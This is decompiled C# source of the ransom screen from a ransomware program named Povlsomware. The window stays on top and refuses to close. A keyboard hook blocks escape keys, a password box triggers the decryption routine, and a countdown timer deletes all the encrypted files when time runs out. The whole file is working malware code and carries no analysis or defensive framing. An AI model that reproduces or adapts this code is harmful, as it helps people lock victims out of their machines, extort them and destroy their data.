using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Povlsomware;

public class PayM3 : Form
{
	private struct Struct0
	{
		public Keys key;

		public int scanCode;

		public int flags;

		public int time;

		public IntPtr extra;
	}

	private delegate IntPtr Delegate0(int nCode_002D0, IntPtr wParam_002D1, IntPtr lParam_002D2);

	private bool success_002D0;

	private IntPtr ptrHook_002D1;

	private Delegate0 objKeyboardProcess_002D2;

	private int timeleft_002D3 = _Constants_Generated_002D7.Field_21_002Dl;

	private int timeleft2_002D4 = _Constants_Generated_002D7.Field_22_002Dm;

	private IContainer components_002D5;

	private TextBox textBox1_002D6;

	private Label label3_002D7;

	private TextBox textBox2_002D8;

	private BackgroundWorker backgroundWorker1_002D9;

	private Timer timer1_002Da;

	private Button button1_002Db;

	private Button button2_002Dc;

	private GroupBox groupBox1_002Dd;

	private Label label5_002De;

	private Label lblMyTime_002Df;

	private GroupBox groupBox2_002Dg;

	private Label label1_002Dh;

	private Label label2_002Di;

	private Timer timer2_002Dj;

	private TextBox textBox3_002Dk;

	private TextBox textBox4_002Dl;

	public PayM3()
	{
		InitializeComponent_002Db();
		((Control)textBox2_002D8).set_Text(_Constants_Generated_002D7.Field_23_002Dn);
	}

	private void Button1_Click_002D0(object sender, EventArgs e)
	{
		string text = ((Control)textBox1_002D6).get_Text();
		if (CheckPassword_002D1(text.ToCharArray()))
		{
			success_002D0 = true;
			((Control)button1_002Db).set_Text(_Constants_Generated_002D7.Field_24_002Do);
			backgroundWorker1_002D9.RunWorkerAsync(text);
		}
		else
		{
			((Control)textBox1_002D6).set_Text(string.Empty);
			((ContainerControl)this).set_ActiveControl((Control)(object)textBox1_002D6);
			((Control)button1_002Db).set_Text(_Constants_Generated_002D7.Field_25_002Dp);
		}
	}

	private bool CheckPassword_002D1(char[] input_002D0)
	{
		char[] pass = Povlsomware_Program_002D2.GetPass();
		if (pass.Length == input_002D0.Length)
		{
			int num = 0;
			while (true)
			{
				if (num < input_002D0.Length)
				{
					if (pass[num] != input_002D0[num])
					{
						break;
					}
					num++;
					continue;
				}
				return true;
			}
			return false;
		}
		return false;
	}

	private void Screen_FormClosing_002D2(object sender, FormClosingEventArgs e)
	{
		if (!success_002D0)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void PayM3_Load_002D3(object sender, EventArgs e)
	{
		((Control)this).Show();
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		objKeyboardProcess_002D2 = captureKey_002D6;
		ptrHook_002D1 = SetWindowsHookEx(_Constants_Generated_002D7.Field_26_002Dq, objKeyboardProcess_002D2, GetModuleHandle(mainModule.ModuleName), 0u);
	}

	private void backgroundWorker1_DoWork_002D4(object sender, DoWorkEventArgs e)
	{
		Povlsomware_Program_002D2.UndoAttack(e.Argument as string);
	}

	private void backgroundWorker1_RunWorkerCompleted_002D5(object sender, RunWorkerCompletedEventArgs e)
	{
		Application.Exit();
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int id_002D0, Delegate0 callback_002D1, IntPtr hMod_002D2, uint dwThreadId_002D3);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hook_002D0);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hook_002D0, int nCode_002D1, IntPtr wp_002D2, IntPtr lp_002D3);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string name_002D0);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern short GetAsyncKeyState(Keys key_002D0);

	private IntPtr captureKey_002D6(int nCode_002D0, IntPtr wp_002D1, IntPtr lp_002D2)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Invalid comparison between Unknown and I4
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Invalid comparison between Unknown and I4
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Invalid comparison between Unknown and I4
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Invalid comparison between Unknown and I4
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Invalid comparison between Unknown and I4
		if (nCode_002D0 >= 0)
		{
			Struct0 @struct = (Struct0)Marshal.PtrToStructure(lp_002D2, typeof(Struct0));
			if ((int)@struct.key == _Constants_Generated_002D7.Field_27_002Dr || (int)@struct.key == _Constants_Generated_002D7.Field_28_002Ds || ((int)@struct.key == _Constants_Generated_002D7.Field_29_002Dt && HasAltModifier_002D7(@struct.flags)) || ((int)@struct.key == _Constants_Generated_002D7.Field_30_002Du && (Control.get_ModifierKeys() & _Constants_Generated_002D7.Field_31_002Dv) == _Constants_Generated_002D7.Field_32_002Dw))
			{
				return (IntPtr)1;
			}
		}
		return CallNextHookEx(ptrHook_002D1, nCode_002D0, wp_002D1, lp_002D2);
	}

	private bool HasAltModifier_002D7(int flags_002D0)
	{
		return (flags_002D0 & _Constants_Generated_002D7.Field_33_002Dx) == _Constants_Generated_002D7.Field_34_002Dy;
	}

	private void timer1_Tick_002D8(object sender, EventArgs e)
	{
		if (timeleft_002D3 > 0)
		{
			timeleft_002D3--;
			int num = timeleft_002D3 / _Constants_Generated_002D7.Field_35_002Dz;
			int num2 = timeleft_002D3 % _Constants_Generated_002D7.Field_36_002DA / _Constants_Generated_002D7.Field_37_002DB;
			int num3 = timeleft_002D3 % _Constants_Generated_002D7.Field_38_002DC;
			((Control)lblMyTime_002Df).set_Text(num + _Constants_Generated_002D7.Field_39_002DD + num2 + _Constants_Generated_002D7.Field_40_002DE + num3);
		}
		else
		{
			string[] array = Povlsomware_Program_002D2.encryptedFiles.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				File.Delete(array[i]);
			}
		}
	}

	private void button2_Click_002D9(object sender, EventArgs e)
	{
		((Control)new Form1()).Show();
	}

	private void timer2_Tick_002Da(object sender, EventArgs e)
	{
		if (timeleft2_002D4 > 0)
		{
			timeleft2_002D4--;
			int num = timeleft2_002D4 / _Constants_Generated_002D7.Field_41_002DF;
			int num2 = timeleft2_002D4 % _Constants_Generated_002D7.Field_42_002DG / _Constants_Generated_002D7.Field_43_002DH;
			int num3 = timeleft2_002D4 % _Constants_Generated_002D7.Field_44_002DI;
			((Control)label2_002Di).set_Text(num + _Constants_Generated_002D7.Field_45_002DJ + num2 + _Constants_Generated_002D7.Field_46_002DK + num3);
		}
		else
		{
			((Control)label1_002Dh).set_Text(_Constants_Generated_002D7.Field_47_002DL);
			((Control)button1_002Db).set_Visible(false);
			((Control)textBox1_002D6).set_Visible(false);
			((Control)label3_002D7).set_Visible(false);
		}
	}

	protected override void Dispose(bool disposing_002D0)
	{
		if (disposing_002D0 && components_002D5 != null)
		{
			components_002D5.Dispose();
		}
		((Form)this).Dispose(disposing_002D0);
	}

	private void InitializeComponent_002Db()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Expected O, but got Unknown
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_0288: Unknown result type (might be due to invalid IL or missing references)
		//IL_036d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0377: Expected O, but got Unknown
		//IL_039b: Unknown result type (might be due to invalid IL or missing references)
		//IL_042e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0438: Expected O, but got Unknown
		//IL_045c: Unknown result type (might be due to invalid IL or missing references)
		//IL_057e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0588: Expected O, but got Unknown
		//IL_0603: Unknown result type (might be due to invalid IL or missing references)
		//IL_060d: Expected O, but got Unknown
		//IL_0728: Unknown result type (might be due to invalid IL or missing references)
		//IL_0732: Expected O, but got Unknown
		//IL_07ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b7: Expected O, but got Unknown
		//IL_08e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08eb: Expected O, but got Unknown
		//IL_0a37: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a41: Expected O, but got Unknown
		//IL_0a46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a91: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a9b: Expected O, but got Unknown
		components_002D5 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(PayM3));
		textBox1_002D6 = new TextBox();
		label3_002D7 = new Label();
		textBox2_002D8 = new TextBox();
		backgroundWorker1_002D9 = new BackgroundWorker();
		timer1_002Da = new Timer(components_002D5);
		button1_002Db = new Button();
		button2_002Dc = new Button();
		groupBox1_002Dd = new GroupBox();
		label5_002De = new Label();
		lblMyTime_002Df = new Label();
		groupBox2_002Dg = new GroupBox();
		label1_002Dh = new Label();
		label2_002Di = new Label();
		timer2_002Dj = new Timer(components_002D5);
		textBox3_002Dk = new TextBox();
		textBox4_002Dl = new TextBox();
		((Control)groupBox1_002Dd).SuspendLayout();
		((Control)groupBox2_002Dg).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)textBox1_002D6).set_Font(new Font(_Constants_Generated_002D7.Field_48_002DM, _Constants_Generated_002D7.Field_49_002DN));
		((Control)textBox1_002D6).set_Location(new Point(_Constants_Generated_002D7.Field_50_002DO, _Constants_Generated_002D7.Field_51_002DP));
		((Control)textBox1_002D6).set_Margin(new Padding(2, 3, 2, 3));
		((Control)textBox1_002D6).set_Name(_Constants_Generated_002D7.Field_52_002DQ);
		((Control)textBox1_002D6).set_Size(new Size(_Constants_Generated_002D7.Field_53_002DR, _Constants_Generated_002D7.Field_54_002DS));
		((Control)textBox1_002D6).set_TabIndex(0);
		((Control)label3_002D7).set_AutoSize(true);
		((Control)label3_002D7).set_Font(new Font(_Constants_Generated_002D7.Field_55_002DT, _Constants_Generated_002D7.Field_56_002DU, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3_002D7).set_ForeColor(SystemColors.ButtonFace);
		((Control)label3_002D7).set_Location(new Point(_Constants_Generated_002D7.Field_57_002DV, _Constants_Generated_002D7.Field_58_002DW));
		((Control)label3_002D7).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label3_002D7).set_Name(_Constants_Generated_002D7.Field_59_002DX);
		((Control)label3_002D7).set_Size(new Size(_Constants_Generated_002D7.Field_60_002DY, _Constants_Generated_002D7.Field_61_002DZ));
		((Control)label3_002D7).set_TabIndex(5);
		((Control)label3_002D7).set_Text(_Constants_Generated_002D7.Field_62_002D01);
		textBox2_002D8.set_AcceptsReturn(true);
		((Control)textBox2_002D8).set_BackColor(Color.Maroon);
		((Control)textBox2_002D8).set_Font(new Font(_Constants_Generated_002D7.Field_63_002D11, _Constants_Generated_002D7.Field_64_002D21, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2_002D8).set_ForeColor(SystemColors.ButtonFace);
		((Control)textBox2_002D8).set_Location(new Point(_Constants_Generated_002D7.Field_65_002D31, _Constants_Generated_002D7.Field_66_002D41));
		((Control)textBox2_002D8).set_Margin(new Padding(2));
		((TextBoxBase)textBox2_002D8).set_Multiline(true);
		((Control)textBox2_002D8).set_Name(_Constants_Generated_002D7.Field_67_002D51);
		((TextBoxBase)textBox2_002D8).set_ReadOnly(true);
		((Control)textBox2_002D8).set_Size(new Size(_Constants_Generated_002D7.Field_68_002D61, _Constants_Generated_002D7.Field_69_002D71));
		((Control)textBox2_002D8).set_TabIndex(6);
		textBox2_002D8.set_TextAlign((HorizontalAlignment)2);
		backgroundWorker1_002D9.DoWork += backgroundWorker1_DoWork_002D4;
		backgroundWorker1_002D9.RunWorkerCompleted += backgroundWorker1_RunWorkerCompleted_002D5;
		timer1_002Da.set_Enabled(true);
		timer1_002Da.set_Interval(_Constants_Generated_002D7.Field_70_002D81);
		timer1_002Da.add_Tick((EventHandler)timer1_Tick_002D8);
		((Control)button1_002Db).set_BackColor(SystemColors.InactiveCaption);
		((Control)button1_002Db).set_Font(new Font(_Constants_Generated_002D7.Field_71_002D91, _Constants_Generated_002D7.Field_72_002Da1));
		((Control)button1_002Db).set_Location(new Point(_Constants_Generated_002D7.Field_73_002Db1, _Constants_Generated_002D7.Field_74_002Dc1));
		((Control)button1_002Db).set_Margin(new Padding(2, 3, 2, 3));
		((Control)button1_002Db).set_Name(_Constants_Generated_002D7.Field_75_002Dd1);
		((Control)button1_002Db).set_Size(new Size(_Constants_Generated_002D7.Field_76_002De1, _Constants_Generated_002D7.Field_77_002Df1));
		((Control)button1_002Db).set_TabIndex(1);
		((Control)button1_002Db).set_Text(_Constants_Generated_002D7.Field_78_002Dg1);
		((ButtonBase)button1_002Db).set_UseVisualStyleBackColor(false);
		((Control)button1_002Db).add_Click((EventHandler)Button1_Click_002D0);
		((Control)button2_002Dc).set_BackColor(SystemColors.InactiveCaption);
		((Control)button2_002Dc).set_Font(new Font(_Constants_Generated_002D7.Field_79_002Dh1, _Constants_Generated_002D7.Field_80_002Di1));
		((Control)button2_002Dc).set_Location(new Point(_Constants_Generated_002D7.Field_81_002Dj1, _Constants_Generated_002D7.Field_82_002Dk1));
		((Control)button2_002Dc).set_Margin(new Padding(2, 3, 2, 3));
		((Control)button2_002Dc).set_Name(_Constants_Generated_002D7.Field_83_002Dl1);
		((Control)button2_002Dc).set_Size(new Size(_Constants_Generated_002D7.Field_84_002Dm1, _Constants_Generated_002D7.Field_85_002Dn1));
		((Control)button2_002Dc).set_TabIndex((int)_Constants_Generated_002D7.Field_86_002Do1);
		((Control)button2_002Dc).set_Text(_Constants_Generated_002D7.Field_87_002Dp1);
		((ButtonBase)button2_002Dc).set_UseVisualStyleBackColor(false);
		((Control)button2_002Dc).add_Click((EventHandler)button2_Click_002D9);
		((Control)groupBox1_002Dd).get_Controls().Add((Control)(object)label5_002De);
		((Control)groupBox1_002Dd).get_Controls().Add((Control)(object)lblMyTime_002Df);
		((Control)groupBox1_002Dd).set_Location(new Point(_Constants_Generated_002D7.Field_88_002Dq1, _Constants_Generated_002D7.Field_89_002Dr1));
		((Control)groupBox1_002Dd).set_Name(_Constants_Generated_002D7.Field_90_002Ds1);
		((Control)groupBox1_002Dd).set_Size(new Size(_Constants_Generated_002D7.Field_91_002Dt1, _Constants_Generated_002D7.Field_92_002Du1));
		((Control)groupBox1_002Dd).set_TabIndex((int)_Constants_Generated_002D7.Field_93_002Dv1);
		groupBox1_002Dd.set_TabStop(false);
		((Control)label5_002De).set_AutoSize(true);
		((Control)label5_002De).set_Font(new Font(_Constants_Generated_002D7.Field_94_002Dw1, _Constants_Generated_002D7.Field_95_002Dx1, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5_002De).set_Location(new Point(8, _Constants_Generated_002D7.Field_96_002Dy1));
		((Control)label5_002De).set_Name(_Constants_Generated_002D7.Field_97_002Dz1);
		((Control)label5_002De).set_Size(new Size(_Constants_Generated_002D7.Field_98_002DA1, _Constants_Generated_002D7.Field_99_002DB1));
		((Control)label5_002De).set_TabIndex(8);
		((Control)label5_002De).set_Text(_Constants_Generated_002D7.Field_100_002DC1);
		((Control)lblMyTime_002Df).set_AutoSize(true);
		((Control)lblMyTime_002Df).set_Font(new Font(_Constants_Generated_002D7.Field_101_002DD1, _Constants_Generated_002D7.Field_102_002DE1, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lblMyTime_002Df).set_ForeColor(Color.White);
		((Control)lblMyTime_002Df).set_Location(new Point(_Constants_Generated_002D7.Field_103_002DF1, _Constants_Generated_002D7.Field_104_002DG1));
		((Control)lblMyTime_002Df).set_Name(_Constants_Generated_002D7.Field_105_002DH1);
		((Control)lblMyTime_002Df).set_Size(new Size(_Constants_Generated_002D7.Field_106_002DI1, _Constants_Generated_002D7.Field_107_002DJ1));
		((Control)lblMyTime_002Df).set_TabIndex(7);
		((Control)lblMyTime_002Df).set_Text(_Constants_Generated_002D7.Field_108_002DK1);
		((Control)groupBox2_002Dg).get_Controls().Add((Control)(object)label1_002Dh);
		((Control)groupBox2_002Dg).get_Controls().Add((Control)(object)label2_002Di);
		((Control)groupBox2_002Dg).set_Location(new Point(_Constants_Generated_002D7.Field_109_002DL1, _Constants_Generated_002D7.Field_110_002DM1));
		((Control)groupBox2_002Dg).set_Name(_Constants_Generated_002D7.Field_111_002DN1);
		((Control)groupBox2_002Dg).set_Size(new Size(_Constants_Generated_002D7.Field_112_002DO1, _Constants_Generated_002D7.Field_113_002DP1));
		((Control)groupBox2_002Dg).set_TabIndex((int)_Constants_Generated_002D7.Field_114_002DQ1);
		groupBox2_002Dg.set_TabStop(false);
		((Control)label1_002Dh).set_AutoSize(true);
		((Control)label1_002Dh).set_Font(new Font(_Constants_Generated_002D7.Field_115_002DR1, _Constants_Generated_002D7.Field_116_002DS1, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1_002Dh).set_Location(new Point(6, _Constants_Generated_002D7.Field_117_002DT1));
		((Control)label1_002Dh).set_Name(_Constants_Generated_002D7.Field_118_002DU1);
		((Control)label1_002Dh).set_Size(new Size(_Constants_Generated_002D7.Field_119_002DV1, _Constants_Generated_002D7.Field_120_002DW1));
		((Control)label1_002Dh).set_TabIndex(8);
		((Control)label1_002Dh).set_Text(_Constants_Generated_002D7.Field_121_002DX1);
		((Control)label2_002Di).set_AutoSize(true);
		((Control)label2_002Di).set_Font(new Font(_Constants_Generated_002D7.Field_122_002DY1, _Constants_Generated_002D7.Field_123_002DZ1, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2_002Di).set_ForeColor(Color.White);
		((Control)label2_002Di).set_Location(new Point(_Constants_Generated_002D7.Field_124_002D02, _Constants_Generated_002D7.Field_125_002D12));
		((Control)label2_002Di).set_Name(_Constants_Generated_002D7.Field_126_002D22);
		((Control)label2_002Di).set_Size(new Size(_Constants_Generated_002D7.Field_127_002D32, _Constants_Generated_002D7.Field_128_002D42));
		((Control)label2_002Di).set_TabIndex(7);
		((Control)label2_002Di).set_Text(_Constants_Generated_002D7.Field_129_002D52);
		timer2_002Dj.set_Enabled(true);
		timer2_002Dj.set_Interval(_Constants_Generated_002D7.Field_130_002D62);
		timer2_002Dj.add_Tick((EventHandler)timer2_Tick_002Da);
		((Control)textBox3_002Dk).set_Location(new Point(_Constants_Generated_002D7.Field_131_002D72, _Constants_Generated_002D7.Field_132_002D82));
		((Control)textBox3_002Dk).set_Name(_Constants_Generated_002D7.Field_133_002D92);
		((Control)textBox3_002Dk).set_Size(new Size(_Constants_Generated_002D7.Field_134_002Da2, _Constants_Generated_002D7.Field_135_002Db2));
		((Control)textBox3_002Dk).set_TabIndex((int)_Constants_Generated_002D7.Field_136_002Dc2);
		((Control)textBox3_002Dk).set_Text(_Constants_Generated_002D7.Field_137_002Dd2);
		((Control)textBox4_002Dl).set_BackColor(Color.Maroon);
		((Control)textBox4_002Dl).set_Font(new Font(_Constants_Generated_002D7.Field_138_002De2, _Constants_Generated_002D7.Field_139_002Df2, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox4_002Dl).set_Location(new Point(_Constants_Generated_002D7.Field_140_002Dg2, _Constants_Generated_002D7.Field_141_002Dh2));
		((Control)textBox4_002Dl).set_Name(_Constants_Generated_002D7.Field_142_002Di2);
		((Control)textBox4_002Dl).set_Size(new Size(_Constants_Generated_002D7.Field_143_002Dj2, _Constants_Generated_002D7.Field_144_002Dk2));
		((Control)textBox4_002Dl).set_TabIndex((int)_Constants_Generated_002D7.Field_145_002Dl2);
		((Control)textBox4_002Dl).set_Text(_Constants_Generated_002D7.Field_146_002Dm2);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(_Constants_Generated_002D7.Field_147_002Dn2, _Constants_Generated_002D7.Field_148_002Do2));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(_Constants_Generated_002D7.Field_149_002Dp2, _Constants_Generated_002D7.Field_150_002Dq2));
		((Control)this).get_Controls().Add((Control)(object)textBox4_002Dl);
		((Control)this).get_Controls().Add((Control)(object)textBox3_002Dk);
		((Control)this).get_Controls().Add((Control)(object)groupBox2_002Dg);
		((Control)this).get_Controls().Add((Control)(object)groupBox1_002Dd);
		((Control)this).get_Controls().Add((Control)(object)button2_002Dc);
		((Control)this).get_Controls().Add((Control)(object)textBox2_002D8);
		((Control)this).get_Controls().Add((Control)(object)label3_002D7);
		((Control)this).get_Controls().Add((Control)(object)button1_002Db);
		((Control)this).get_Controls().Add((Control)(object)textBox1_002D6);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject(_Constants_Generated_002D7.Field_151_002Dr2));
		((Form)this).set_Margin(new Padding(2, 3, 2, 3));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(_Constants_Generated_002D7.Field_152_002Ds2);
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text(_Constants_Generated_002D7.Field_153_002Dt2);
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Screen_FormClosing_002D2));
		((Form)this).add_Load((EventHandler)PayM3_Load_002D3);
		((Control)groupBox1_002Dd).ResumeLayout(false);
		((Control)groupBox1_002Dd).PerformLayout();
		((Control)groupBox2_002Dg).ResumeLayout(false);
		((Control)groupBox2_002Dg).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
